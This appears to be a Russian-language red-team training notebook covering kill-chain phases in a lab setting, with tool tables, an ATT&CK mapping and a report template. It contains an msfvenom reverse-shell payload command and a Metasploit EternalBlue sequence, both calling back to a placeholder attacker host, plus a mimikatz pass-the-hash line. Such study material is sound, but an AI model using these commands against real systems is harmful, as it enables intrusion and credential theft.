#  Red Team: Exploit Simulation

## Цель
Изучить базовые техники Red Team для симуляции реальных атак (только в контролируемой среде!).

## Важно
**Все действия выполняются ТОЛЬКО в тестовой среде с явным разрешением!**

## Фазы Red Team операции

### 1. Reconnaissance (Разведка)

#### OSINT (Open Source Intelligence)
- [ ] Сбор информации о цели из открытых источников
- [ ] Поиск email адресов (theHarvester, Hunter.io)
- [ ] Анализ DNS записей
- [ ] Поиск поддоменов

#### Active Reconnaissance
```bash
# Nmap сканирование
nmap -sV -sC -oA scan_results target.com

# Поиск поддоменов
subfinder -d target.com

# DNS enumeration
dig target.com ANY
```

### 2. Weaponization (Вооружение)

- Подготовка эксплойтов
- Создание payload
- Обход антивируса (опционально)

```bash
# Пример: создание payload с msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=attacker_ip LPORT=4444 \
  -f exe -o payload.exe
```

### 3. Delivery (Доставка)

Методы доставки (в тестовой среде):
- Фишинговые письма (симуляция)
- Вредоносные вложения
- Компрометация веб-сайта
- USB Drop Attack (физический доступ)

### 4. Exploitation (Эксплуатация)

#### Пример: Эксплуатация уязвимости SMB (EternalBlue)

```bash
# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit
```

### 5. Persistence (Закрепление)

- [ ] Создание backdoor
- [ ] Добавление в автозагрузку
- [ ] Создание scheduled tasks

### 6. Lateral Movement (Горизонтальное перемещение)

- Pass-the-Hash атаки
- Использование скомпрометированных credentials
- Эксплуатация доверенных отношений

```bash
# Пример: Pass-the-Hash с mimikatz
mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:hash
```

### 7. Exfiltration (Эксфильтрация)

- Сбор целевых данных
- Шифрование перед отправкой
- Передача через C2 канал

## Инструменты Red Team

| Инструмент | Назначение |
|-----------|-----------|
| Metasploit | Exploitation framework |
| Cobalt Strike | C2 и post-exploitation |
| Empire/Powershell Empire | Post-exploitation |
| BloodHound | Active Directory анализ |
| Mimikatz | Credential dumping |
| Burp Suite | Web app pentesting |

## MITRE ATT&CK Mapping

| Тактика | Техника | ID |
|---------|---------|-----|
| Initial Access | Phishing | T1566 |
| Execution | PowerShell | T1059.001 |
| Persistence | Registry Run Keys | T1547.001 |
| Credential Access | OS Credential Dumping | T1003 |
| Lateral Movement | Remote Services | T1021 |

## Симуляция: Полный killchain

```
1. Разведка: Nmap scan  найдены открытые порты 445, 3389
2. Эксплуатация: EternalBlue exploit  получен meterpreter shell
3. Escalation: mimikatz  извлечены credentials
4. Lateral Movement: psexec  доступ к другим хостам
5. Persistence: создан scheduled task для backdoor
6. Exfiltration: собраны данные, отправлены через C2
```

## Red Team Report Template

```markdown
# Red Team Exercise Report

**Date:** 00.00.2024
**Team:** Artem (solo exercise)
**Target:** Lab Environment

## Executive Summary
[Краткие результаты]

## Scope
- IP Range: 192.168.1.0/24
- Time: 2 weeks
- Rules of Engagement: [...]

## Findings
1. Initial access через EternalBlue
2. Credential dumping successful
3. Lateral movement achieved
4. Data exfiltration simulated

## Recommendations for Blue Team
1. Patch SMBv1
2. Implement EDR
3. Network segmentation
4. Credential rotation policy

## Timeline
[Детальная временная шкала]
```

## Notes
**Здесь записывай наблюдения и команды**

_Помни:_
- Всегда получай письменное разрешение
- Работай только в изолированной среде
- Документируй каждый шаг
- Сообщай о найденных уязвимостях

---
**Дата:** 08.10.2024  
**Среда:** Isolated Lab Environment

